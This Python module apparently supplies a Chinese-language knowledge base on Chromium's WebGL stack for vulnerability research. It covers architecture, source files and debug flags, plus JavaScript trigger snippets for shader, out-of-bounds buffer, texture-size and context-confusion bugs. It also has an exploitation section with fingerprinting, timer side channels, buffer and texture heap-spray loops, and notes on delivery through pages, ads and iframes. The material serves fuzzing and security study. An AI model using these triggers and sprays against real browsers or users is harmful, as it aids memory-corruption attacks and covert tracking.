"""
WebGL Knowledge Base

WebGL提供浏览器中的3D图形渲染能力，基于OpenGL ES。
"""

WEBGL_OVERVIEW = """
# WebGL Overview

WebGL (Web Graphics Library) 是浏览器中的3D图形API，基于OpenGL ES 2.0/3.0。

## 核心组件
1. **WebGL Context**: 渲染上下文管理
2. **ANGLE**: OpenGL ES到DirectX/Vulkan/Metal的转换层
3. **GPU Process**: GPU命令的沙箱化执行
4. **Command Buffer**: 渲染命令序列化

## 架构层次
```
JavaScript WebGL API
        ↓
    Blink Bindings
        ↓
    Command Buffer (序列化)
        ↓
    GPU Process
        ↓
    ANGLE (转换层)
        ↓
    Native Graphics API (D3D/Vulkan/Metal/OpenGL)
```

## 关键目录
- `gpu/command_buffer/`: 命令缓冲区
- `gpu/GLES2/`: GLES2实现
- `third_party/angle/`: ANGLE转换层
- `third_party/blink/renderer/modules/webgl/`: WebGL绑定

## WebGL版本
- **WebGL 1.0**: 基于OpenGL ES 2.0
- **WebGL 2.0**: 基于OpenGL ES 3.0，更多功能
"""

WEBGL_ARCHITECTURE = """
# WebGL 架构详解

## Command Buffer机制
```
Renderer Process          GPU Process
     |                         |
 WebGL调用              命令解码执行
     ↓                         ↓
 序列化命令 ────IPC────→ 反序列化
     ↓                         ↓
 共享内存               ANGLE/Native API
```

## 关键数据结构
- **Buffer Objects**: 顶点/索引数据
- **Texture Objects**: 纹理数据
- **Shader Objects**: 着色器程序
- **Framebuffer Objects**: 离屏渲染目标
- **Renderbuffer Objects**: 渲染缓冲

## ANGLE转换
- 将OpenGL ES调用转换为平台原生API
- Windows: Direct3D 9/11
- macOS: Metal
- Linux: Vulkan/OpenGL
- 转换过程中可能引入漏洞
"""

WEBGL_VULNERABILITY_PATTERNS = """
# WebGL 常见漏洞模式

## 1. Shader编译漏洞

### 模式
- 畸形GLSL着色器导致编译器崩溃
- 着色器验证绕过
- ANGLE转换错误

### 触发示例
```javascript
let canvas = document.createElement('canvas');
let gl = canvas.getContext('webgl');

// 畸形顶点着色器
let vs = gl.createShader(gl.VERTEX_SHADER);
gl.shaderSource(vs, `
    attribute vec4 a;
    void main() {
        // 极端值或畸形语法
        gl_Position = vec4(1e38, 1e38, 1e38, 1e38);
    }
`);
gl.compileShader(vs);

// 畸形片段着色器
let fs = gl.createShader(gl.FRAGMENT_SHADER);
gl.shaderSource(fs, `
    precision highp float;
    void main() {
        // 复杂表达式可能触发编译器bug
        float x = 1.0;
        for(int i = 0; i < 10000; i++) {
            x = sin(cos(tan(x)));
        }
        gl_FragColor = vec4(x);
    }
`);
gl.compileShader(fs);
```

## 2. Buffer溢出

### 模式
- 顶点缓冲区越界访问
- 索引缓冲区越界
- Uniform缓冲区溢出

### 触发示例
```javascript
let gl = canvas.getContext('webgl');

// 创建小缓冲区
let buf = gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER, buf);
gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([1,2,3]), gl.STATIC_DRAW);

// 尝试越界访问
gl.vertexAttribPointer(0, 4, gl.FLOAT, false, 0, 1000000);
gl.enableVertexAttribArray(0);
gl.drawArrays(gl.TRIANGLES, 0, 99999);  // OOB
```

## 3. 纹理处理漏洞

### 模式
- 压缩纹理解码错误
- 纹理尺寸整数溢出
- 跨进程纹理共享问题

### 触发示例
```javascript
let gl = canvas.getContext('webgl');
let tex = gl.createTexture();
gl.bindTexture(gl.TEXTURE_2D, tex);

// 极大尺寸
gl.texImage2D(
    gl.TEXTURE_2D, 0, gl.RGBA,
    0x7FFFFFFF, 0x7FFFFFFF, 0,  // 极大尺寸
    gl.RGBA, gl.UNSIGNED_BYTE, null
);

// 压缩纹理
let ext = gl.getExtension('WEBGL_compressed_texture_s3tc');
if (ext) {
    gl.compressedTexImage2D(
        gl.TEXTURE_2D, 0, ext.COMPRESSED_RGBA_S3TC_DXT5_EXT,
        1024, 1024, 0,
        new Uint8Array(/* 畸形压缩数据 */)
    );
}
```

## 4. Command Buffer漏洞

### 模式
- 命令序列化/反序列化错误
- 共享内存越界
- 命令验证绕过

### 触发位置
- `gpu/command_buffer/service/`
- `gpu/command_buffer/client/`

## 5. 状态机漏洞

### 模式
- GL状态不一致
- 对象生命周期错误
- 上下文切换问题

### 触发示例
```javascript
let gl1 = canvas1.getContext('webgl');
let gl2 = canvas2.getContext('webgl');

// 在不同上下文间共享对象
let tex = gl1.createTexture();
// 尝试在gl2中使用gl1的对象
gl2.bindTexture(gl2.TEXTURE_2D, tex);  // 可能导致问题
```

## 6. 扩展相关漏洞

### 模式
- WebGL扩展实现错误
- 扩展之间的交互问题
- 平台特定扩展bug

### 常见扩展
```javascript
// 获取所有扩展
let exts = gl.getSupportedExtensions();

// 危险扩展
gl.getExtension('WEBGL_debug_renderer_info');  // 信息泄露
gl.getExtension('EXT_disjoint_timer_query');   // 时间攻击
```
"""

WEBGL_DEBUGGING = """
# WebGL 调试技术

## Chrome调试标志
```bash
--enable-webgl-developer-extensions
--disable-gpu-sandbox
--enable-logging=stderr --v=1
--use-angle=d3d11  # 指定ANGLE后端
--use-angle=gl
--use-angle=vulkan
```

## 内部页面
```
chrome://gpu/
chrome://tracing/  (GPU事件追踪)
```

## 关键源文件
- `gpu/command_buffer/service/gles2_cmd_decoder.cc`: 命令解码
- `gpu/command_buffer/service/texture_manager.cc`: 纹理管理
- `gpu/command_buffer/service/buffer_manager.cc`: 缓冲区管理
- `third_party/angle/src/libANGLE/`: ANGLE核心

## 调试工具
```javascript
// WebGL Inspector (浏览器扩展)
// Spector.js
let spector = new SPECTOR.Spector();
spector.captureCanvas(canvas);

// 手动状态检查
console.log(gl.getError());  // 检查GL错误
console.log(gl.getParameter(gl.MAX_TEXTURE_SIZE));
```

## 常见错误码
```javascript
gl.NO_ERROR           // 0 - 无错误
gl.INVALID_ENUM       // 0x0500
gl.INVALID_VALUE      // 0x0501
gl.INVALID_OPERATION  // 0x0502
gl.OUT_OF_MEMORY      // 0x0505
```
"""

WEBGL_EXPLOITATION = """
# WebGL 利用技术

## GPU进程沙箱
- WebGL运行在GPU进程中
- GPU进程有独立沙箱
- 需要先逃逸GPU沙箱才能完全利用

## 信息泄露
```javascript
// 渲染器信息
let ext = gl.getExtension('WEBGL_debug_renderer_info');
if (ext) {
    console.log(gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
    console.log(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
}

// 通过readPixels泄露
let pixels = new Uint8Array(4);
gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
```

## 时间侧信道
```javascript
// 已被限制的API
let ext = gl.getExtension('EXT_disjoint_timer_query');
if (ext) {
    let query = gl.createQuery();
    gl.beginQuery(ext.TIME_ELAPSED_EXT, query);
    // 执行操作
    gl.endQuery(ext.TIME_ELAPSED_EXT);
}
```

## 堆喷射
```javascript
// 通过Buffer喷射
let buffers = [];
for (let i = 0; i < 1000; i++) {
    let buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1024).fill(0x41414141), gl.STATIC_DRAW);
    buffers.push(buf);
}

// 通过Texture喷射
let textures = [];
for (let i = 0; i < 100; i++) {
    let tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    let data = new Uint8Array(256 * 256 * 4).fill(0x41);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
    textures.push(tex);
}
```

## 触发方式
1. **自动执行**: 加载包含恶意WebGL的页面
2. **用户交互**: 需要点击等交互触发
3. **广告/iframe**: 通过第三方内容触发
"""


def get_webgl_knowledge() -> str:
    """获取完整的WebGL知识库"""
    return "\n\n".join([
        WEBGL_OVERVIEW,
        WEBGL_ARCHITECTURE,
        WEBGL_VULNERABILITY_PATTERNS,
        WEBGL_DEBUGGING,
    ])


WEBGL_KNOWLEDGE_SECTIONS = {
    "overview": WEBGL_OVERVIEW,
    "architecture": WEBGL_ARCHITECTURE,
    "patterns": WEBGL_VULNERABILITY_PATTERNS,
    "debugging": WEBGL_DEBUGGING,
    "exploitation": WEBGL_EXPLOITATION,
}
